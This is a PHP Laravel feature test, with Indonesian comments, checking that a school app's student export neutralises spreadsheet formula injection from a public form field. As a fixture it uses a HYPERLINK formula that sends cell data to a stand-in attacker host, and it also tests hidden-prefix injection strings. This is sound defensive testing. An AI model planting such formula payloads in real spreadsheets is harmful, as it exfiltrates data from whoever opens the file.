<?php

namespace Tests\Feature;

use App\Exports\StudentsExport;
use App\Models\Classroom;
use App\Models\Student;
use App\Models\User;
use App\Support\Excel\PengikatNilaiAman;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Maatwebsite\Excel\Excel as FormatExcel;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * Teks yang diketik orang lain tidak boleh menjadi rumus di berkas yang
 * diunduh wali kelas.
 *
 * Ini diuji lewat ekspor SUNGGUHAN, bukan dengan memanggil pengikatnya
 * langsung: yang rapuh justru pemasangannya di AppServiceProvider. Memanggil
 * PengikatNilaiAman sendiri akan tetap hijau meski konfigurasinya salah nama
 * dan tidak satu pun ekspor benar-benar memakainya.
 */
class EksporRumusAmanTest extends TestCase
{
    use RefreshDatabase;

    /** Sel data pertama pada kolom berjudul $judul, dicari dari headings(). */
    private function selDataPertama(Classroom $class, string $judul): \PhpOffice\PhpSpreadsheet\Cell\Cell
    {
        $export = new StudentsExport($class);
        $kolom = array_search($judul, $export->headings(), true);
        $this->assertNotFalse($kolom, "Kolom {$judul} tidak ada di ekspor");

        $berkas = tempnam(sys_get_temp_dir(), 'ekspor').'.xlsx';
        file_put_contents($berkas, Excel::raw($export, FormatExcel::XLSX));

        try {
            // Baris 1 judul kolom, baris 2 data pertama.
            return IOFactory::load($berkas)->getActiveSheet()->getCell([$kolom + 1, 2]);
        } finally {
            @unlink($berkas);
        }
    }

    public function test_isian_formulir_publik_diekspor_sebagai_teks(): void
    {
        $user = User::factory()->create();
        $class = Classroom::factory()->create(['user_id' => $user->id]);
        $this->actingAs($user);

        // Hobi diisi lewat formulir biodata bertautan publik — tanpa akun.
        $jahat = '=HYPERLINK("http://penyerang.tld/?d="&A1,"Klik")';
        Student::factory()->create([
            'user_id' => $user->id, 'class_id' => $class->id,
            'nis' => '2025001', 'hobi' => $jahat,
        ]);

        $sel = $this->selDataPertama($class, 'Hobi');

        $this->assertSame(DataType::TYPE_STRING, $sel->getDataType(),
            'Sel harus bertipe teks, bukan rumus');
        $this->assertSame($jahat, $sel->getValue(), 'Isinya tetap utuh, hanya tidak dieksekusi');
    }

    /** Angka & tanggal tidak boleh ikut jadi teks — format kolom harus utuh. */
    public function test_nilai_wajar_tidak_dipaksa_jadi_teks(): void
    {
        $binder = new PengikatNilaiAman;
        $lembar = new \PhpOffice\PhpSpreadsheet\Spreadsheet;
        $sel = $lembar->getActiveSheet()->getCell('A1');

        $binder->bindValue($sel, 150000);

        $this->assertSame(DataType::TYPE_NUMERIC, $sel->getDataType());
        $this->assertSame(150000, $sel->getValue());
    }

    /** TAB dan CR dipakai menyelundupkan rumus melewati pemeriksaan sepintas. */
    public function test_awalan_tersembunyi_ikut_dinetralkan(): void
    {
        $binder = new PengikatNilaiAman;
        $lembar = new \PhpOffice\PhpSpreadsheet\Spreadsheet;

        foreach (["\t=1+1", "\r=1+1", '+1+1', '-1+1', '@SUM(A1)'] as $i => $nilai) {
            $sel = $lembar->getActiveSheet()->getCell('A'.($i + 1));
            $binder->bindValue($sel, $nilai);

            $this->assertSame(DataType::TYPE_STRING, $sel->getDataType(),
                "Awalan berbahaya lolos: ".json_encode($nilai));
        }
    }
}
